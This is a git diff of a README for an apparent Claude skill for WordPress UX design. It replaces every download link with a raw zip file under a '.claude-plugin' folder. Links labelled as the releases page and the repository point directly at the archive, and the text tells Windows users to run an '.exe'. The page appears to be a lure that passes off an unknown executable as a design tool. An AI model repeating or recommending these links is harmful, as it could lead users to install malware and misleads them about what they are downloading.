@@ -1,6 +1,6 @@
 # 🎨 wp-ux-design-claude-skill - Enhance Your WordPress Design Effortlessly
 
-[![Download Now](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip%20Now-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip)
 
 ## 🌟 Overview
 
@@ -10,13 +10,13 @@ The **wp-ux-design-claude-skill** is a powerful tool designed to improve the use
 
 To get started with wp-ux-design-claude-skill, you will need to download the application. Follow these simple steps:
 
-1. Visit the Releases page: [Download Here](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip)
+1. Visit the Releases page: [Download Here](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip)
 2. Look for the latest version.
 3. Click on the link to download the version compatible with your operating system.
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: [Download Here](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip).
+1. **Visit this page to download**: [Download Here](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip).
 2. Find the latest release listed.
 3. Click on the appropriate file for your operating system. 
    - For Windows users, download the `.exe` file.
@@ -56,8 +56,8 @@ If you need help with any specific feature, refer to the in-application help sec
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip)
-- [Download Here](https://github.com/bacondoomslayer/wp-ux-design-claude-skill/raw/refs/heads/main/skills/wp-ux-design/design_claude_skill_ux_wp_v3.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip)
+- [Download Here](https://raw.githubusercontent.com/bacondoomslayer/wp-ux-design-claude-skill/main/.claude-plugin/wp-skill-claude-design-ux-2.5.zip)
 
 ## 🙋 FAQ
 
